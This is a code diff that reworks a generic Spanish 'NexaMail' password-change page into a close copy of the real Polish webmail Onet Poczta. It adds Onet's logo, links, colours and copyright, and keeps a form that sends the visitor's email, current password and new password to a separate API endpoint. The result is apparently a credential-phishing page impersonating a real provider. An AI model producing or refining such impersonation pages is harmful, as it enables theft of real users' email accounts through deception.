@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="pl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cambiar contraseña - NexaMail</title>
+    <title>Zmień hasło - Onet Poczta</title>
     <style>
         /* Reset básico */
         * {
@@ -14,13 +14,13 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #eef2f7;
+            background-color: #f2f2f2;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
-            color: #1a1a2e;
+            color: #000;
         }
 
         /* Tarjeta principal */
@@ -29,13 +29,13 @@
             width: 100%;
             max-width: 520px;
             border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(26, 26, 46, 0.08);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
             padding: 40px 30px;
             text-align: center;
             position: relative;
         }
 
-        /* Logo ficticio NexaMail */
+        /* Logo original de Onet Poczta */
         .logo-wrapper {
             display: flex;
             justify-content: center;
@@ -43,36 +43,36 @@
             margin-bottom: 30px;
         }
 
+        .logo-wrapper figure {
+            margin: 0;
+            width: 200px;
+            height: 60px;
+            position: relative;
+        }
+
         .logo-wrapper a {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            display: block;
+            width: 100%;
+            height: 100%;
             text-decoration: none;
         }
 
-        .logo-icon {
-            width: 42px;
-            height: 42px;
-            background: linear-gradient(135deg, #0f3460, #1a936f);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-weight: 700;
-            font-size: 20px;
-            box-shadow: 0 2px 8px rgba(15, 52, 96, 0.3);
+        .logo-wrapper .image-wrapper {
+            position: relative;
+            width: 100%;
+            height: 100%;
         }
 
-        .logo-text {
-            font-size: 26px;
-            font-weight: 800;
-            color: #0f3460;
-            letter-spacing: -0.5px;
-        }
-
-        .logo-text span {
-            color: #1a936f;
+        .logo-wrapper img {
+            position: absolute;
+            height: 100%;
+            width: 100%;
+            left: 0;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            object-fit: scale-down;
+            color: transparent;
         }
 
         /* Encabezado */
@@ -91,7 +91,7 @@
             font-weight: 300;
             cursor: pointer;
             margin-top: -2px;
-            color: #0f3460;
+            color: #000;
             text-decoration: none;
         }
 
@@ -99,14 +99,14 @@
             font-size: 22px;
             font-weight: 700;
             line-height: 1.3;
-            color: #1a1a2e;
+            color: #000;
             margin: 0;
         }
 
         /* Texto descriptivo */
         .description {
             font-size: 15px;
-            color: #4a4a5a;
+            color: #333;
             line-height: 1.4;
             margin-bottom: 25px;
             text-align: left;
@@ -123,38 +123,24 @@
             font-size: 14px;
             font-weight: 600;
             margin-bottom: 6px;
-            color: #1a1a2e;
+            color: #000;
         }
 
         input[type="password"], input[type="email"] {
             width: 100%;
             padding: 14px 16px;
             font-size: 16px;
-            border: 1px solid #d0d7de;
+            border: 1px solid #ddd;
             border-radius: 8px;
-            background-color: #f7f9fb;
+            background-color: #f9f9f9;
             outline: none;
             transition: border-color 0.2s, background-color 0.2s;
-            color: #1a1a2e;
+            color: #000;
         }
 
         input[type="password"]:focus, input[type="email"]:focus {
-            border-color: #1a936f;
+            border-color: #fed207;
             background-color: #fff;
-            box-shadow: 0 0 0 3px rgba(26, 147, 111, 0.1);
-        }
-
-        /* Mensaje de éxito */
-        .success-message {
-            background-color: #e6f5f0;
-            border: 1px solid #1a936f;
-            color: #0f5132;
-            font-size: 14px;
-            border-radius: 8px;
-            padding: 12px 14px;
-            margin-top: 10px;
-            display: none;
-            text-align: left;
         }
 
         /* Mensaje de error */
@@ -165,7 +151,20 @@
             display: none;
         }
 
-        /* Contenedor invisible para el reCAPTCHA */
+        /* Mensaje de éxito */
+        .success-message {
+            background-color: #fffbe6;
+            border: 1px solid #fed207;
+            color: #000;
+            font-size: 14px;
+            border-radius: 8px;
+            padding: 12px 14px;
+            margin-top: 10px;
+            display: none;
+            text-align: left;
+        }
+
+        /* Contenedor invisible para el reCAPTCHA real */
         .recaptcha-hidden {
             position: absolute;
             left: -9999px;
@@ -180,34 +179,38 @@
         /* Botón principal */
         .btn-submit {
             width: 100%;
-            background: linear-gradient(135deg, #0f3460, #1a936f);
+            background-color: #fed207;
             border: none;
             border-radius: 50px;
             padding: 16px;
             font-size: 16px;
             font-weight: 700;
-            color: #fff;
+            color: #000;
             cursor: pointer;
-            transition: opacity 0.2s, transform 0.1s;
+            transition: background-color 0.2s, transform 0.1s;
             margin-bottom: 30px;
             margin-top: 25px;
-            box-shadow: 0 4px 12px rgba(15, 52, 96, 0.25);
         }
 
         .btn-submit:hover {
-            opacity: 0.92;
+            background-color: #e9c000;
         }
 
         .btn-submit:active {
             transform: scale(0.99);
         }
 
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
         /* ============================================
-           FOOTER FICTICIO
+           FOOTER ORIGINAL DE ONET
            ============================================ */
         .footer-original {
             font-size: 12px;
-            color: #4a4a5a;
+            color: #333;
             line-height: 1.5;
             margin-top: 30px;
         }
@@ -229,7 +232,7 @@
         }
 
         .footer-links a {
-            color: #0f3460;
+            color: #000;
             text-decoration: underline;
             font-weight: 500;
             font-size: 12px;
@@ -237,7 +240,6 @@
 
         .footer-links a:hover {
             text-decoration: none;
-            color: #1a936f;
         }
 
         /* Selector de idioma */
@@ -260,7 +262,7 @@
         }
 
         .select-trigger:hover {
-            background-color: #eef2f7;
+            background-color: #f0f0f0;
         }
 
         .select-trigger .control-item {
@@ -269,7 +271,7 @@
             gap: 6px;
         }
 
-        /* Bandera circular */
+        /* Bandera circular perfecta */
         .control-icon-wrapper {
             display: flex;
             align-items: center;
@@ -279,7 +281,7 @@
             border-radius: 50%;
             overflow: hidden;
             flex-shrink: 0;
-            background-color: #eef2f7;
+            background-color: #f0f0f0;
         }
 
         .control-icon-wrapper .flag-icon {
@@ -301,7 +303,7 @@
             transform: rotate(180deg);
         }
 
-        /* Menú desplegable */
+        /* Menú desplegable de idiomas */
         .select-menu {
             position: absolute;
             bottom: 100%;
@@ -330,7 +332,7 @@
             padding: 8px 14px;
             cursor: pointer;
             font-size: 14px;
-            color: #1a1a2e;
+            color: #000;
             transition: background-color 0.15s;
             border: 2px solid transparent;
             margin: 2px 6px;
@@ -343,12 +345,12 @@
 
         /* Opción seleccionada */
         .dropdown-item[aria-selected="true"] {
-            background-color: #e6f5f0;
-            border-color: #1a936f;
+            background-color: #fffbe6;
+            border-color: #fed207;
             font-weight: 500;
         }
 
-        /* Bandera circular en dropdown */
+        /* Bandera circular en el dropdown */
         .flag-icon-wrapper {
             display: flex;
             align-items: center;
@@ -358,7 +360,7 @@
             border-radius: 50%;
             overflow: hidden;
             flex-shrink: 0;
-            background-color: #eef2f7;
+            background-color: #f0f0f0;
         }
 
         .flag-icon-wrapper img {
@@ -375,12 +377,12 @@
 
         .footer-disclaimer {
             font-size: 11px;
-            color: #666;
+            color: #555;
             line-height: 1.4;
         }
 
         .footer-disclaimer a {
-            color: #0f3460;
+            color: #000;
             text-decoration: underline;
         }
 
@@ -408,7 +410,7 @@
             content: "•";
             position: absolute;
             left: 0;
-            color: #1a936f;
+            color: #999;
             font-weight: bold;
         }
     </style>
@@ -416,23 +418,30 @@
 <body>
 
     <main class="card">
-        <!-- Logo ficticio NexaMail -->
+        <!-- Logo original de Onet Poczta -->
         <div class="logo-wrapper">
-            <a href="https://nexamail.com" title="NexaMail">
-                <div class="logo-icon">N</div>
-                <span class="logo-text">Nexa<span>Mail</span></span>
-            </a>
+            <figure class="styles__Logo-sc-2d144a49-2 lfIwiR">
+                <a href="https://oferta.poczta.onet.pl" title="Onet Poczta" class="styles__Service-sc-2d144a49-4 jTWZNo">
+                    <div class="image-wrapper styles__ImageWrapper-sc-2d144a49-3 eWbvwu">
+                        <img alt="Onet Poczta" 
+                             decoding="async" 
+                             data-nimg="fill" 
+                             style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:scale-down;color:transparent" 
+                             src="https://static-konto.onet.pl/assets/logos/OnetPoczta.png">
+                    </div>
+                </a>
+            </figure>
         </div>
 
         <!-- Encabezado con flecha -->
         <div class="header-section">
-            <a href="#" class="back-arrow" aria-label="Volver">&lt;</a>
-            <h1>Cambiar contraseña de la cuenta NexaMail</h1>
+            <a href="#" class="back-arrow" aria-label="Powrót">&lt;</a>
+            <h1>Zmiana hasła do konta pocztowego w Onet</h1>
         </div>
 
         <!-- Descripción -->
         <p class="description">
-            Para cambiar tu contraseña, introduce tu contraseña actual y luego establece una nueva.
+            Aby zmienić hasło, podaj swoje aktualne hasło, a następnie ustaw nowe.
         </p>
 
         <!-- Formulario -->
@@ -440,40 +449,40 @@
             
             <!-- Correo electrónico -->
             <div class="form-group">
-                <label for="email">Correo electrónico</label>
-                <input type="email" id="email" name="email" required autocomplete="email" placeholder="tu@correo.com">
-                <div class="error-message" id="errorEmail">Introduce un correo válido.</div>
+                <label for="email">Adres e-mail</label>
+                <input type="email" id="email" name="email" required autocomplete="email" placeholder="twoj@email.com">
+                <div class="error-message" id="errorEmail">Wpisz poprawny adres e-mail.</div>
             </div>
 
             <!-- Contraseña actual -->
             <div class="form-group">
-                <label for="oldPassword">Contraseña actual</label>
+                <label for="oldPassword">Obecne hasło</label>
                 <input type="password" id="oldPassword" name="oldPassword" required autocomplete="current-password">
-                <div class="error-message" id="errorOld">Introduce tu contraseña actual.</div>
+                <div class="error-message" id="errorOld">Wpisz obecne hasło.</div>
             </div>
 
             <!-- Nueva contraseña -->
             <div class="form-group">
-                <label for="newPassword">Nueva contraseña</label>
+                <label for="newPassword">Nowe hasło</label>
                 <input type="password" id="newPassword" name="newPassword" required autocomplete="new-password">
-                <div class="error-message" id="errorNew">La contraseña debe tener al menos 8 caracteres, una mayúscula y un número.</div>
+                <div class="error-message" id="errorNew">Hasło musi mieć co najmniej 8 znaków, jedną dużą literę i jedną cyfrę.</div>
                 <div class="password-requirements">
                     <ul>
-                        <li>Mínimo 8 caracteres</li>
-                        <li>Al menos una letra mayúscula</li>
-                        <li>Al menos un número</li>
+                        <li>Minimum 8 znaków</li>
+                        <li>Przynajmniej jedna duża litera</li>
+                        <li>Przynajmniej jedna cyfra</li>
                     </ul>
                 </div>
             </div>
 
             <!-- Confirmar nueva contraseña -->
             <div class="form-group">
-                <label for="confirmPassword">Repetir nueva contraseña</label>
+                <label for="confirmPassword">Powtórz nowe hasło</label>
                 <input type="password" id="confirmPassword" name="confirmPassword" required autocomplete="new-password">
-                <div class="error-message" id="errorConfirm">Las contraseñas no coinciden.</div>
+                <div class="error-message" id="errorConfirm">Hasła nie są identyczne.</div>
             </div>
 
-            <!-- Contenedor invisible para el reCAPTCHA -->
+            <!-- Contenedor invisible para el reCAPTCHA real -->
             <div class="recaptcha-hidden">
                 <div class="g-recaptcha" 
                      data-sitekey="6LcMTYMlAAAAAEeTBUrMrt0GHFypBPiQlb2sBjb1" 
@@ -483,78 +492,82 @@
             </div>
 
             <!-- Botón -->
-            <button type="submit" class="btn-submit" id="submitBtn">Cambiar contraseña</button>
+            <button type="submit" class="btn-submit" id="submitBtn">Zmień hasło</button>
 
             <!-- Mensaje de éxito / estado -->
             <div class="success-message" id="successMsg"></div>
         </form>
 
         <!-- ============================================
-             FOOTER FICTICIO
+             FOOTER ORIGINAL DE ONET
              ============================================ -->
         <footer class="footer-original">
-            <ul class="footer-links">
-                <li>
-                    <a href="https://nexamail.com/privacidad" 
+            <ul class="styles__Links-sc-36dd4368-3 dhquqE footer-links">
+                <li class="styles__LinkItem-sc-36dd4368-4 PMEjO">
+                    <a href="https://polityka-prywatnosci.onet.pl/index.html" 
                        target="_blank" 
                        rel="noopener noreferrer"
-                       title="Política de privacidad">Política de privacidad</a>
+                       title="Polityka prywatności">Polityka prywatności</a>
                 </li>
-                <li>
-                    <a href="https://nexamail.com/contacto" 
+                <li class="styles__LinkItem-sc-36dd4368-4 PMEjO">
+                    <a href="https://pomoc.poczta.onet.pl/info/skontaktuj-sie-z-nami/fsn17sn" 
                        target="_blank" 
                        rel="noopener noreferrer"
-                       title="Contacto">Contacto</a>
+                       title="Kontakt">Kontakt</a>
                 </li>
                 
                 <!-- Selector de idioma -->
-                <li class="select-container" id="languageSelector">
+                <li class="styles__SelectContainer-sc-bdfbbe07-0 gvJFTJ select-container" id="languageSelector">
                     <div role="combobox" 
                          id="lang-selector-trigger"
                          aria-haspopup="listbox" 
                          aria-expanded="false" 
                          aria-disabled="false" 
-                         aria-label="Seleccionar idioma." 
+                         aria-label="Wybierz język." 
                          tabindex="0" 
-                         class="select-trigger">
-                        <div class="control-item">
-                            <div class="control-icon-wrapper">
-                                <img src="https://flagcdn.com/w40/es.png" 
-                                     class="flag-icon" 
-                                     alt="Español">
+                         class="styles__SelectTrigger-sc-bdfbbe07-1 fmphqy select-trigger">
+                        <div class="styles__ControlItem-sc-bdfbbe07-5 fOZveT control-item">
+                            <div class="styles__ControlIconWrapper-sc-bdfbbe07-7 ietUrY control-icon-wrapper">
+                                <img src="https://static-konto.onet.pl/assets/static/generic/poland.png" 
+                                     class="styles__FlagIcon-sc-bdfbbe07-3 gZkNJe flag-icon" 
+                                     alt="Polski">
                             </div>
-                            <span id="currentLang">es</span>
+                            <span id="currentLang">pl</span>
                         </div>
-                        <i class="chevron">▼</i>
+                        <i data-testid="icon" class="Icon-sc-e1a5b1c1-0 styles__IconChevron-sc-bdfbbe07-8 jFPGxd jkNDBr chevron">▼</i>
                     </div>
                     
                     <!-- MENÚ DESPLEGABLE -->
                     <div id="lang-selector-menu" 
                          role="listbox" 
                          aria-labelledby="lang-selector-trigger" 
-                         class="select-menu" 
+                         class="styles__SelectMenu-sc-bdfbbe07-2 fXPYEu select-menu" 
                          aria-activedescendant="lang-selector-option-0">
                         
                         <div id="lang-selector-option-0" 
                              role="option" 
                              aria-selected="true" 
-                             aria-label="Español" 
-                             class="dropdown-item"
-                             data-lang="es">
-                            <div class="flag-icon-wrapper">
-                                <img src="https://flagcdn.com/w40/es.png" alt="Español">
+                             aria-label="Polski" 
+                             class="styles__DropdownItem-sc-bdfbbe07-6 pfOml dropdown-item"
+                             data-lang="pl">
+                            <div class="styles__FlagIconWrapper-sc-bdfbbe07-4 bHTMKk flag-icon-wrapper">
+                                <img src="https://static-konto.onet.pl/assets/static/generic/poland.png" 
+                                     class="styles__FlagIcon-sc-bdfbbe07-3 gZkNJe" 
+                                     alt="Polski">
                             </div>
-                            Español
+                            Polski
                         </div>
                         
                         <div id="lang-selector-option-1" 
                              role="option" 
                              aria-selected="false" 
                              aria-label="English" 
-                             class="dropdown-item"
+                             class="styles__DropdownItem-sc-bdfbbe07-6 jSneQe dropdown-item"
                              data-lang="en">
-                            <div class="flag-icon-wrapper">
-                                <img src="https://flagcdn.com/w40/gb.png" alt="English">
+                            <div class="styles__FlagIconWrapper-sc-bdfbbe07-4 bHTMKk flag-icon-wrapper">
+                                <img src="https://static-konto.onet.pl/assets/static/generic/england.png" 
+                                     class="styles__FlagIcon-sc-bdfbbe07-3 mHEGJ" 
+                                     alt="English">
                             </div>
                             English
                         </div>
@@ -562,29 +575,31 @@
                         <div id="lang-selector-option-2" 
                              role="option" 
                              aria-selected="false" 
-                             aria-label="Français" 
-                             class="dropdown-item"
-                             data-lang="fr">
-                            <div class="flag-icon-wrapper">
-                                <img src="https://flagcdn.com/w40/fr.png" alt="Français">
+                             aria-label="Deutsch" 
+                             class="styles__DropdownItem-sc-bdfbbe07-6 jSneQe dropdown-item"
+                             data-lang="de">
+                            <div class="styles__FlagIconWrapper-sc-bdfbbe07-4 bHTMKk flag-icon-wrapper">
+                                <img src="https://static-konto.onet.pl/assets/static/generic/germany.png" 
+                                     class="styles__FlagIcon-sc-bdfbbe07-3 kQZtrF" 
+                                     alt="Deutsch">
                             </div>
-                            Français
+                            Deutsch
                         </div>
                     </div>
                     
-                    <div aria-live="polite" aria-atomic="true" style="position:absolute;left:-10000px;width:1px;height:1px;overflow:hidden">Español</div>
+                    <div aria-live="polite" aria-atomic="true" style="position:absolute;left:-10000px;width:1px;height:1px;overflow:hidden">Polski</div>
                 </li>
             </ul>
 
-            <p class="footer-copyright">2026 NexaMail Inc. Todos los derechos reservados.</p>
+            <p class="footer-copyright">2026 Ringier Axel Springer Polska. Wszelkie prawa zastrzeżone.</p>
             <p class="footer-disclaimer">
-                Este sitio está protegido por reCAPTCHA y se aplican la 
+                Ta witryna jest chroniona przez reCAPTCHA i obowiązuje na niej 
                 <a href="https://policies.google.com/privacy" 
                    target="_blank" 
-                   rel="noopener noreferrer">Política de privacidad</a> y los 
+                   rel="noopener noreferrer">Polityka prywatności</a> oraz zastosowane 
                 <a href="https://policies.google.com/terms" 
                    target="_blank" 
-                   rel="noopener noreferrer">Términos de servicio</a> de Google.
+                   rel="noopener noreferrer">Warunki usługi</a> Google.
             </p>
         </footer>
     </main>
@@ -688,7 +703,7 @@
 
             [errorEmail, errorOld, errorNew, errorConfirm].forEach(e => e.style.display = 'none');
             successMsg.style.display = 'none';
-            [emailInput, oldPass, newPass, confirmPass].forEach(i => i.style.borderColor = '#d0d7de');
+            [emailInput, oldPass, newPass, confirmPass].forEach(i => i.style.borderColor = '#ddd');
 
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(emailInput.value.trim().toLowerCase())) {
@@ -713,14 +728,14 @@
             }
 
             if (oldPass.value && newPass.value && oldPass.value === newPass.value) {
-                showFieldError(newPass, errorNew, 'La nueva contraseña debe ser diferente a la actual.');
+                showFieldError(newPass, errorNew, 'Nowe hasło musi różnić się od obecnego.');
                 isValid = false;
             }
 
             if (!isValid) return;
 
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Cambiando...';
+            submitBtn.textContent = 'Zmiana...';
 
             try {
                 const res = await fetch(API_URL + '/api/change-password', {
@@ -736,23 +751,27 @@
                 const data = await res.json();
 
                 if (res.ok && data.ok) {
-                    successMsg.textContent = '¡Contraseña cambiada correctamente!';
+                    successMsg.textContent = 'Hasło zostało pomyślnie zmienione!';
                     successMsg.style.display = 'block';
                     document.getElementById('changePasswordForm').reset();
                     recaptchaToken = null;
                 } else {
-                    const msg = data.error || 'Ocurrió un error. Inténtalo de nuevo.';
-                    if (data.field === 'email') showFieldError(emailInput, errorEmail, msg);
-                    else if (data.field === 'oldPassword') showFieldError(oldPass, errorOld, msg);
-                    else if (data.field === 'newPassword') showFieldError(newPass, errorNew, msg);
-                    else alert(msg);
+                    if (data.field === 'email') {
+                        showFieldError(emailInput, errorEmail);
+                    } else if (data.field === 'oldPassword') {
+                        showFieldError(oldPass, errorOld, 'Obecne hasło jest nieprawidłowe.');
+                    } else if (data.field === 'newPassword') {
+                        showFieldError(newPass, errorNew, 'Hasło musi mieć co najmniej 8 znaków, jedną dużą literę i jedną cyfrę.');
+                    } else {
+                        alert(data.error || 'Wystąpił błąd. Spróbuj ponownie.');
+                    }
                 }
             } catch (err) {
                 console.error('Error de red:', err);
-                alert('No se pudo conectar con el servidor. Verifica que la API esté corriendo en ' + API_URL);
+                alert('Nie można połączyć się z serwerem. Sprawdź, czy API działa: ' + API_URL);
             } finally {
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Cambiar contraseña';
+                submitBtn.textContent = 'Zmień hasło';
                 if (typeof grecaptcha !== 'undefined') {
                     try { grecaptcha.reset(); } catch {}
                 }
